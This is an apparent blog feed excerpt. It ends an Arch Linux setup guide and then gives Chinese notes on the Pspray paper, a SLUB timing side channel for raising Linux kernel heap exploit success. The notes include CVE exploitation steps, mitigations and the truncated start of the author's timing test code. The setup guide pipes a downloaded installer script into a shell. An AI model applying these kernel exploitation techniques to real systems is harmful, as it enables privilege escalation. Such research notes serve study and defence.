href="https://wiki.archlinux.org/title/PulseAudio/Troubleshooting#Browsers_load_videos_but_do_no_play">Wiki</a> 使用如下命令可以临时解决：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pulseaudio --<span class="hljs-built_in">kill</span> &amp;&amp; pulseaudio --start</span><br></code></pre></td></tr></table></figure><p>完美的解决方案是是用 <code>pipewire-pulse</code> 替换掉 <code>pluseaudio</code> 与 <code>pluseaudio-bluetooth</code>，然后重启：</p><blockquote><p>安装这个包的时候会自动把另外两个包给卸了</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S pipewire-pulse</span><br></code></pre></td></tr></table></figure><h1 id="0x06-个人配置优化"><a href="#0x06-个人配置优化" class="headerlink" title="0x06. 个人配置优化"></a>0x06. 个人配置优化</h1><h3 id="触摸板开启点按即单击"><a href="#触摸板开启点按即单击" class="headerlink" title="触摸板开启点按即单击"></a>触摸板开启点按即单击</h3><p>触摸板习惯性的操作应当是按一下就是单击，而非按下机械左键才是单击， KDE 默认是关闭了这个选项，不过我们在系统设置中的 <code>Hardware→Input Devices→Touchpad</code> 里将 <code>Tap-to-click</code> 勾选上即可</p><h3 id="触摸板上下滑动方向改变"><a href="#触摸板上下滑动方向改变" class="headerlink" title="触摸板上下滑动方向改变"></a>触摸板上下滑动方向改变</h3><p>笔者的使用习惯中双指滑动是上下反向，KDE 中默认是上下同向，这里只需要在系统设置中的 <code>Hardware→Input Devices→Touchpad</code> 里将 <code>Invert scroll direction (Natual scrolling)</code> 勾选上即可</p><h3 id="设置双击打开文件"><a href="#设置双击打开文件" class="headerlink" title="设置双击打开文件"></a>设置双击打开文件</h3><p>Dolphin 中默认单击就打开文件了，而对于笔者来说更习惯 Windows 那样的单击选择双击打开的模式，这里只需要在系统设置中的 <code>Workspace Behaviour-&gt;General Behaviour</code> 中勾选 <code>Selects them</code> 即可</p><h3 id="使用-zsh-替换-bash"><a href="#使用-zsh-替换-bash" class="headerlink" title="使用 zsh 替换 bash"></a>使用 zsh 替换 bash</h3><p><code>Z Shell</code> 是一个比默认自带的 <code>bash</code> 更加强大的 shell，这里我们通过如下命令即可将当前用户的默认 shell 替换为 zsh：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S zsh</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sh -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br><br></code></pre></td></tr></table></figure><p>后面各种主题啥的配置可以参照<a href="https://zhuanlan.zhihu.com/p/58073103">知乎上的这篇文章</a>，笔者用的是 <code>gnzh</code> 主题</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;不好用，在安装界面睡了三个小时&lt;/p&gt;</summary>
    
    
    
    <category term="DISTRO" scheme="https://arttnba3.github.io/categories/DISTRO/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Arch Linux" scheme="https://arttnba3.github.io/tags/Arch-Linux/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x03】论文笔记：Pspray: Timing Side-Channel based Linux Kernel Heap Exploitation Technique </title>
    <link href="https://arttnba3.github.io/2023/09/16/PAPER-0X03-PSPRAY/"/>
    <id>https://arttnba3.github.io/2023/09/16/PAPER-0X03-PSPRAY/</id>
    <published>2023-09-15T18:02:37.000Z</published>
    <updated>2023-09-15T18:43:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>🎵THIS IS MY KINGDOM C*M🎵</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>Linux kernel exploitation 方向的论文虽然数量极少，但能上顶会的大部分都还挺有意思的，尤其是发在 USENIX 2023 上的<a href="https://www.usenix.org/conference/usenixsecurity23/presentation/lee-yoochan">这一篇论文</a>笔者觉得是<strong>非常有实战价值</strong>的（笑），因此简单做个小笔记</p><p>因为这一领域的论文读起来比较轻松所以这一篇笔者只会记录其中比较精华的部分，部分地方不一定保留论文原文（而是会选择同义词代换</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>攻击的隐秘性对于攻击者而言是最为至关重要的，因为一旦攻击被发现就寄了，但由于 SLUB 分配器的构造的缘故成功完成漏洞利用的概率都较低</p><p>本文提出 $Pspray$ ：<strong>一项基于时序侧信道的漏洞利用技术</strong>，经测试这项技术可以显著提高漏洞利用的成功率</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><blockquote><p><del>没必要讲.jpg</del></p></blockquote><p>Linux kernel 有着如 KCFI、KASLR、KDFI 在内的多种保护措施，这使得攻击者难以成功完成利用</p><p>对攻击者而言攻击的隐秘性是最重要的需求之一，若攻击失败则将会被防守方发现，因为这通常会留下痕迹（例如 kernel panic），因此攻击者非常需要提高攻击的成功率</p><p>内核漏洞大都为堆上漏洞（例如由 syzkaller 找到的 1107 个漏洞中有 968 个都是堆相关的），而对攻击者而言要完成利用十分困难，因为这需要攻击者能预测当前的堆分配器状态，而内核堆管理器 SLUB 的结构使其难以被完成</p><blockquote><p>这里原论文还举了个例子，👴就⑧摘抄了，毕竟看这篇论文的前提肯定是默认带🔥都是会点 kernel pwn 的，<del>不会 kernel pwn 你看这篇论文干啥嘛</del></p></blockquote><p>本文提出一种名为 $PSPRAY$ 的新的内核堆利用手法，其可以显著地提升对抗 slab freelist 随机化等保护措施的堆利用的成功率，更具体地说， $PSPRAY$ 的核心是使用时序侧信道来间接获取 slab 的分配状态</p><p>本文工作总结如下：</p><ul><li><strong>分析了堆利用的失败情况</strong></li><li><strong>新的堆利用技术</strong></li><li><strong>新的防御技术</strong></li></ul><h1 id="0x02-Background"><a href="#0x02-Background" class="headerlink" title="0x02. Background"></a>0x02. Background</h1><h2 id="2-1-SLUB-allocator"><a href="#2-1-SLUB-allocator" class="headerlink" title="2.1 SLUB allocator"></a>2.1 SLUB allocator</h2><blockquote><p>建议直接看👴的<a href="https://arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/">这篇博客</a></p></blockquote><h4 id="The-architecture-of-SLUB-allocator"><a href="#The-architecture-of-SLUB-allocator" class="headerlink" title="The architecture of SLUB allocator"></a>The architecture of SLUB allocator</h4><p>SLUB 是 Linux kernel 默认的堆分配器，其基本结构如图 1 所示，其包含了多个不同类型与尺寸的 <code>kmem_cache</code> 内存池，每个 <code>kmem_cache</code> 都有一个 per-CPU 内存池，其中包含独立的 $freelist$ 、$page$ 、$partial$ ，$freelist$ 为一个基于 $page$ 页面上空闲对象所组成的单向链表</p><p>除了 $freelist$  以外，每个 slab 都有自己独立的 $freelist$ ；除了 $CPU\ partial\ page\ freelist$ 以外，每个 node 也有自己独立的 $CPU\ partial\ page\ freelist$ ，在  $CPU\ partial\ page\ freelist$ 用完之后启用</p><p><img src="https://s2.loli.net/2023/09/13/JNkMTZ1s7RQ4DqB.png"></p><h4 id="Allocation-sequence-of-SLUB-allocator"><a href="#Allocation-sequence-of-SLUB-allocator" class="headerlink" title="Allocation sequence of SLUB allocator"></a>Allocation sequence of SLUB allocator</h4><p>图 2 展示了 SLUB 的分配流程：</p><ul><li>首先尝试从 $CPU\ freelist$ 上取</li><li>$CPU-freelist$ 为空，尝试从 $CPU\ page$ 上取 $freelist$，给回  $CPU\ freelist$ （可以理解为 percpu freelist 的初始化）</li><li>$CPU-page$ 也空了，尝试从 $CPU\ partial$ 链表上取</li><li>$CPU\ partial$ 链表也空了，尝试从  $NODE\ partial$ 链表上取</li><li>$NODE\ partial$ 链表也空了，只好转向 $Buddy\ System$ 请求分配新的内存页</li></ul><blockquote><p>buddy system 也空了就该 OOM kill 了（悲</p></blockquote><p><img src="https://s2.loli.net/2023/09/13/zGYbCeZSf41IqdF.png"></p><h2 id="2-2-Slab-Freelist-Random"><a href="#2-2-Slab-Freelist-Random" class="headerlink" title="2.2 Slab Freelist Random"></a>2.2 Slab Freelist Random</h2><p>简单来说就是 <code>CONFIG_SLAB_FREELIST_RANDOM</code> 这个保护的开启会使得 $freelist$ 的初始化更加随机化，空闲对象链表连接不再按常规的地址顺序连接，而是会被打乱</p><p><img src="https://s2.loli.net/2023/09/13/fUMnhteR78rXZOA.png"></p><h1 id="0x03-Exploitation-method-and-failure-cases"><a href="#0x03-Exploitation-method-and-failure-cases" class="headerlink" title="0x03. Exploitation method and failure cases"></a>0x03. Exploitation method and failure cases</h1><p>本节主要讲常规的漏洞利用手法</p><h2 id="3-1-Out-Of-Bounds"><a href="#3-1-Out-Of-Bounds" class="headerlink" title="3.1 Out-Of-Bounds"></a>3.1 Out-Of-Bounds</h2><h4 id="Exploitation-method"><a href="#Exploitation-method" class="headerlink" title="Exploitation method"></a>Exploitation method</h4><p>OOB 就是越界读写，通常来说我们需要在漏洞对象后面放一个被溢出的目标对象，最简单的做法就是直接<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x06-Kernel-Heap-Heap-Spraying">堆喷</a>就完事了</p><p><img src="https://s2.loli.net/2023/09/13/E9hJxTW1ajNmvYe.png"></p><h4 id="Failure-cases"><a href="#Failure-cases" class="headerlink" title="Failure cases"></a>Failure cases</h4><p>但因为地址随机化的存在，我们的被溢出目标对象不一定能恰好落在漏洞对象后面，中间可能隔了几个对象或者直接就错位了：(</p><p><img src="https://s2.loli.net/2023/09/13/ZpbTYHlzVqhLmO5.png"></p><h4 id="Probability-model"><a href="#Probability-model" class="headerlink" title="Probability model"></a>Probability model</h4><p>在开启 freelist 随机化之后的漏洞利用成功率如下，基于 Linux kernel 使用 <code>Fisher-Yates shuffle</code> 算法来进行随机化这个前提计算的，其中 $N$ 为一张 slub 上的总对象数，同时我们假设在同一张 slab 上分配了 1 个漏洞对象与 $k$ 个 victim 对象：</p><p>$$<br>\frac{ _{N-1} C _{k}* _{k} C _{1}}{ _{N} C _{k} * _{N-k} C _{1}} &#x3D; \frac{k}{N}<br>$$</p><p>总体而言，我们从 $N$ 个空闲对象中选择 $k$ 个 victim 对象 与 1 个漏洞对象，在进行利用时 victim 对象与漏洞对象必须相邻，因此我们从 $N-1$ 个对象中取出 $k$ 个对象（剩余一个作为漏洞对象），喷射的 victim 对象数量可以从 0 到 $N-1$ ，因此对于带有 random slab freelist 的 OOB 利用而言的成功率计算如下：</p><p>$$<br>P_{OOB}^{Baseline}&#x3D;\frac{\sum_{k&#x3D;0}^{N-1}\frac{k}{N}}{N}&#x3D;\frac{N-1}{2N}<br>$$</p><h2 id="3-2-Use-After-Free-and-Double-Free"><a href="#3-2-Use-After-Free-and-Double-Free" class="headerlink" title="3.2 Use-After-Free and Double-Free"></a>3.2 Use-After-Free and Double-Free</h2><h4 id="UAF-exploitation-method"><a href="#UAF-exploitation-method" class="headerlink" title="UAF exploitation method"></a>UAF exploitation method</h4><p>UAF 漏洞的利用通常是要将漏洞对象与 victim 对象放在同一内存地址，图 6 展示了对 CVE-2019-2215 的利用过程，首先用 <code>epoll_ctl()</code> 分配漏洞对象，接下来用 <code>ioctl()</code> 释放漏洞对象，随后用 <code>msgsnd()</code> 取回刚刚释放的对象，最后再用 <code>close()</code> 将该对象释放</p><p><img src="https://s2.loli.net/2023/09/15/mP3yD9Yq2lKIgWQ.png"></p><h4 id="DF-exploitation-method"><a href="#DF-exploitation-method" class="headerlink" title="DF exploitation method"></a>DF exploitation method</h4><blockquote><p>在笔者看来 DF 和 UAF 本质上是一样的</p></blockquote><p>Double Free 漏洞则是将一个已经被释放的对象再次释放，从而通过留下的垂悬指针完成利用（笔者注：其实就是 UAF 嘛），图 7 展示了对 CVE-2017-6074 的利用过程，首先通过 <code>connect()</code> 分配漏洞对象与三个额外的对象冰释放掉漏洞对象，随后通过 <code>msgsnd()</code> 分配 victim 对象，接下来通过 <code>shutdown()</code> 完成 DF 将 victim 对象释放掉，最后分配目标对象，当我们访问 victim 对象时目标对象便会被破坏</p><p><img src="https://s2.loli.net/2023/09/15/mZLUcSAIPhW7TOJ.png"></p><h4 id="Failure-cases-1"><a href="#Failure-cases-1" class="headerlink" title="Failure cases"></a>Failure cases</h4><p>由于 SLUB 的特性，对 UAF 与 DF 漏洞的利用是有可能失败的，图 8 显示了利用 UAF&#x2F;DF 漏洞失败的一种可能性，即额外的“噪声”分配导致了 perCPU page 发生了改变</p><blockquote><p>笔者注：比如说 <a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x0A-%E5%86%85%E6%A0%B8%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">key_ctl</a> 这样的</p></blockquote><p><img src="https://s2.loli.net/2023/09/15/revXByanRGVKmS1.png"></p><h4 id="Probability-model-1"><a href="#Probability-model-1" class="headerlink" title="Probability model"></a>Probability model</h4><p>UAF 与 DF 漏洞利用的成功率如下，$N$ 为每张 slab 上的对象数量， $A$ 为系统调用所分配的对象数量（即分配的漏洞对象数量与额外结构体的数量之和）：</p><p><img src="https://s2.loli.net/2023/09/16/so5iPEvlCcuBtjN.png"></p><blockquote><p>这里用 Latex 打不出来只能上图了，因为笔者博客的 latex 支持非常残疾（悲</p></blockquote><p>有两种情况：当 <code>A &lt; N</code> 时，成功率决定于漏洞对象与额外对象是否在同一张 slab 上；当 <code>A &gt;= N</code> 时，当分配漏洞对象的系统调用所分配的最后一个对象完全填充 CPU page 时利用将会成功，若一张 slab 被耗尽，对应的 slab 会被移动到 full 链表上，CPU page 便变为空，此时若对象被释放，则包含该对象的 slab 将重新变为 CPU page</p><h1 id="0x04-Our-Approach-PSPRAY"><a href="#0x04-Our-Approach-PSPRAY" class="headerlink" title="0x04. Our Approach : PSPRAY"></a>0x04. Our Approach : PSPRAY</h1><p>漏洞利用失败的主要原因是对 slab 信息的缺失，本文找到了一种能够获取 slab 的部分分配信息的时序侧信道方法，从而提高利用成功概率</p><h2 id="4-1-Timing-Side-Channel-on-SLUB-allocator"><a href="#4-1-Timing-Side-Channel-on-SLUB-allocator" class="headerlink" title="4.1 Timing Side-Channel on SLUB allocator"></a>4.1 Timing Side-Channel on SLUB allocator</h2><p>如图 2.1 所示，SLUB 有五条不同深度的分配路径以优化性能表现，为了弄清不同路径的表现，作者通过 <code>msgsnd()</code> 系统调用（如图 4.3 所示其仅分配一个对象）测试了从 <code>kmalloc()</code> 的核心函数 <code>slab_alloc_node()</code> 的开始到结尾的性能，经过多轮测试发现 <code>slow-path</code> 与其他路径相比存在明显的表现差距，因此攻击者可以通过测量分配时间得知内存分配所经历的路径</p><h2 id="4-2-Inferring-Allocation-Status"><a href="#4-2-Inferring-Allocation-Status" class="headerlink" title="4.2 Inferring Allocation Status"></a>4.2 Inferring Allocation Status</h2><p> <code>slow-path</code> 以外的分配路径的分配状态都是难以确定的，但 <code>slow-path</code> 的行为与其他路径不同，此时内核会从 buddy system 分配一张新 slab，由此我们可以知道当前的 slab 刚被分配且仅分配了一个对象</p><h2 id="4-3-Proof-Of-Concept"><a href="#4-3-Proof-Of-Concept" class="headerlink" title="4.3 Proof-Of-Concept"></a>4.3 Proof-Of-Concept</h2><h4 id="Finding-an-adequate-system-call"><a href="#Finding-an-adequate-system-call" class="headerlink" title="Finding an adequate system call"></a>Finding an adequate system call</h4><p>为了使用时序侧信道，我们需要找到满足以下三个条件的系统调用：</p><ul><li>普通用户权限可用</li><li>仅分配一个对象</li><li>除了对象分配以外的性能开销要小</li></ul><p>作者修改了 kernel 以在系统调用仅分配一个 <code>kmalloc-xx</code> 中的对象时 panic，并使用 Syzkaller 进行测试，找到了如表 A.1 所示的 23 个满足该条件的系统调用，这些从用户空间拷贝数据的系统调用涵盖了 <code>kmalloc-32</code> 到 <code>kmalloc-8192</code>，同时其内存分配以外的代码不会过于影响内存</p><p><img src="https://s2.loli.net/2023/09/15/5EYjRperomGIhwB.png"></p><h4 id="Experiment"><a href="#Experiment" class="headerlink" title="Experiment"></a>Experiment</h4><p>简单来说就是用 <code>msgsnd()</code> 做了堆喷 1000 次的测试并测量其表现</p><h4 id="Experiment-Results"><a href="#Experiment-Results" class="headerlink" title="Experiment Results"></a>Experiment Results</h4><p>图 9 为使用 <code>msgsnd()</code> 进行测试的结果，可知 <code>fast-path</code> 与 <code>medium-path</code> 间难以做出区分（都要消耗 10000 左右的 CPU 周期），但 <code>slow-path</code> 可以被区分（要消耗 35000 左右的 CPU 周期）</p><p><img src="https://s2.loli.net/2023/09/15/DhbYf6i1sMHFeLR.png"></p><h1 id="0x05-Application-of-PSPRAY"><a href="#0x05-Application-of-PSPRAY" class="headerlink" title="0x05. Application of PSPRAY"></a>0x05. Application of PSPRAY</h1><h2 id="5-1-OOB-Exploitation"><a href="#5-1-OOB-Exploitation" class="headerlink" title="5.1 OOB Exploitation"></a>5.1 OOB Exploitation</h2><p>图 10 展示了在开启 free list randomization 的情况下对 OOB 漏洞应用 PSPRAY 的过程：</p><ul><li>使用 PSPRAY 确定 <code>slow-path</code> 是否被执行，此时 slab <code>B</code> 被创建且已分配了一个结构体</li><li>接下来我们堆喷 <code>N-1</code> 个对象将其完全分配（假设一张 slab 上有 <code>N</code> 个对象）</li><li>我们接下来的分配又会分配一张新的 slab <code>C</code> ，分配 <code>N - 1</code> 个 victim 对象</li><li>分配漏洞对象，此时若漏洞对象不为 slab 上地址最高处对象，则 OOB 将成功</li></ul><p><img src="https://s2.loli.net/2023/09/15/pBelmXzb6I1fuPH.png"></p><p>利用成功率为：<br>$$<br>P_{OOB}^{PSPRAY}&#x3D;\frac{N-1}{N}<br>$$</p><h2 id="5-2-UAF-and-DF-Exploitation"><a href="#5-2-UAF-and-DF-Exploitation" class="headerlink" title="5.2 UAF and DF Exploitation"></a>5.2 UAF and DF Exploitation</h2><p>图 11 展示了如何在 UAF 与 DF 漏洞上利用 PSPRAY：</p><ul><li>首先用 PSPRAY 找到新 slab 被分配的时间点，此时我们便知道一张已分配一个对象的 slab 被创建了</li><li>然后正常利用 UAF&#x2F;DF</li></ul><blockquote><p>👴寻思好像没啥可讲的</p></blockquote><p><img src="https://s2.loli.net/2023/09/15/wLO8TNY4Q1e7zn5.png"></p><p>利用成功率为：</p><p><img src="https://s2.loli.net/2023/09/16/V6jo4yT2OSLMBAk.png"></p><h1 id="0x06-Attack-Evaluation"><a href="#0x06-Attack-Evaluation" class="headerlink" title="0x06. Attack Evaluation"></a>0x06. Attack Evaluation</h1><p>论文里这一节主要是做测试</p><h2 id="6-1-Synthetic-Vulnerability"><a href="#6-1-Synthetic-Vulnerability" class="headerlink" title="6.1 Synthetic Vulnerability"></a>6.1 Synthetic Vulnerability</h2><p>主要是作者自己开发漏洞自己打，测试用的 OOB 洞长这个样子：</p><p><img src="https://s2.loli.net/2023/09/15/CAsp71oLIZPBykf.png"></p><p>UAF 洞长这个样子：</p><p><img src="https://s2.loli.net/2023/09/15/kW8aPNTIxOEsBnr.png"></p><p>结果如表 1 所示：</p><p><img src="https://s2.loli.net/2023/09/15/DpNMjv3GAdstokR.png"></p><h2 id="6-2-Real-World-Vulnerability"><a href="#6-2-Real-World-Vulnerability" class="headerlink" title="6.2 Real-World Vulnerability"></a>6.2 Real-World Vulnerability</h2><p>打了一些真实的洞，结果如表 2 所示，和公开的 exp 相比利用成功率提升明显：</p><p><img src="https://s2.loli.net/2023/09/15/rGhvEOywRWi6S1B.png"></p><h1 id="0x07-Mitigation"><a href="#0x07-Mitigation" class="headerlink" title="0x07. Mitigation"></a>0x07. Mitigation</h1><p>PSPRAY 主要有两个点：</p><ul><li><code>slow-path</code> 的分配速度差异明显</li><li><code>slow-path</code> 的出现意味着此时的 freelist 为空</li></ul><p>作者认为针对 PSPRAY 的防御手段主要有以下两个：</p><ul><li>让所有的分配路径都有着相似的性能表现（针对第一个点）</li><li>随机化 <code>slow-path</code> 分配上下文（针对第二个点）</li></ul><h3 id="Mitigation-1-Uniform-Allocation-Performance"><a href="#Mitigation-1-Uniform-Allocation-Performance" class="headerlink" title="Mitigation #1. Uniform Allocation Performance."></a>Mitigation #1. Uniform Allocation Performance.</h3><p>基本没啥活可以整</p><h3 id="Mitigation-2-Randomized-Slow-path-Allocation-Context"><a href="#Mitigation-2-Randomized-Slow-path-Allocation-Context" class="headerlink" title="Mitigation #2. Randomized Slow-path Allocation Context."></a>Mitigation #2. Randomized Slow-path Allocation Context.</h3><p>主要是让分配并不是在 freelist 为空时才进入到 <code>slow-path</code> ，这里设计了一个简易的算法就是让 slab 上对象的 idx 与一个常量相等且 CPU partial 为空时进到一个新的 slow path，从而使得这两个 slow path 无法被区分</p><p><img src="https://s2.loli.net/2023/09/15/EnYdvIbhfp4FkUS.png"></p><p>图 12 显示了这种方法的基本原理：</p><p><img src="https://s2.loli.net/2023/09/15/yNGZAbSz7qaJfrs.png"></p><h1 id="0x08-Discussion"><a href="#0x08-Discussion" class="headerlink" title="0x08. Discussion"></a>0x08. Discussion</h1><h2 id="8-1-The-Noise"><a href="#8-1-The-Noise" class="headerlink" title="8.1 The Noise"></a>8.1 The Noise</h2><p>由调度器带来的噪音仍可以阻碍利用，主要来自两种机制：CPU 迁移与上下文切换；这样的噪声可以在分配&#x2F;释放一个目标对象或漏洞对象时出现</p><blockquote><p>👴感觉用 <code>sched_setaffinity()</code> 绑核可以完美解决这个问题</p></blockquote><h2 id="8-2-The-Other-OSes"><a href="#8-2-The-Other-OSes" class="headerlink" title="8.2 The Other OSes"></a>8.2 The Other OSes</h2><p>其他的 OSes 也可以采用 PSPRAY 方法进行利用，因为其采用与 Linux 相类似的堆分配器，作者这里测了 FreeBSD 和 XNU，具体的笔者就不贴了：）</p><h1 id="0x09-Related-work"><a href="#0x09-Related-work" class="headerlink" title="0x09. Related work"></a>0x09. Related work</h1><h3 id="Kernel-Automated-Exploit-Generation"><a href="#Kernel-Automated-Exploit-Generation" class="headerlink" title="Kernel Automated Exploit Generation"></a>Kernel Automated Exploit Generation</h3><p>自动化利用，如 <a href="https://www.usenix.org/conference/usenixsecurity18/presentation/wu-wei">FUZE</a> 用 fuzz 和符号执行来构造利用，<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/chen-weiteng">KOOBE</a> 则针对 OOB 类漏洞进行自动化利用生成</p><blockquote><p>AEG 说实话还是挺有意思的，可惜笔者之前确实没咋关注过：）</p></blockquote><h3 id="Kernel-Exploit-Techniques"><a href="#Kernel-Exploit-Techniques" class="headerlink" title="Kernel Exploit Techniques"></a>Kernel Exploit Techniques</h3><p>类似的利用技术相关的研究有 ret2usr、<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir">ret2dir</a>、<a href="https://www.usenix.org/conference/usenixsecurity21/presentation/lee-yoochan">ExpRace</a>、<a href="https://dl.acm.org/doi/10.1145/3372297.3423353">Eloise</a> 等</p><h3 id="Timing-Side-Channel-Attack-against-Kernel"><a href="#Timing-Side-Channel-Attack-against-Kernel" class="headerlink" title="Timing Side-Channel Attack against Kernel"></a>Timing Side-Channel Attack against Kernel</h3><p>对时序侧信道技术的研究也很多，比如说 <a href="https://ieeexplore.ieee.org/document/6547110">https://ieeexplore.ieee.org/document/6547110</a>、<a href="https://dl.acm.org/doi/10.1145/2976749.2978321">DRK</a>、<a href="https://www.usenix.org/conference/usenixsecurity18/presentation/lipp">Meltdown</a> 等</p><h1 id="0x0A-Conclusion"><a href="#0x0A-Conclusion" class="headerlink" title="0x0A. Conclusion"></a>0x0A. Conclusion</h1><p>这篇论文基于 SLUB 分配器的构造提出了名为 $PSPRAY$ 的时序侧信道利用手法，经测试能够有效提升 OOB 与 UAF&#x2F;DF 漏洞的利用成功率</p><blockquote><p>👴寻思好像也没啥好讲的</p></blockquote><h1 id="0xFF-What’s-more"><a href="#0xFF-What’s-more" class="headerlink" title="0xFF. What’s more?"></a>0xFF. What’s more?</h1><p>笔者自己也试了一下这个方法，发现<strong>slow-path 的执行时间确实可以与其他路径进行区分</strong>（只需要用一些统计学手段就好），下面是笔者自己测试用的代码，<strong>在真机测试与 QEMU 虚拟机测试中 slow-path 都表现出了显著的性能开销，这意味着这种方法确乎可以被应用于 CTF 与实战当中</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title 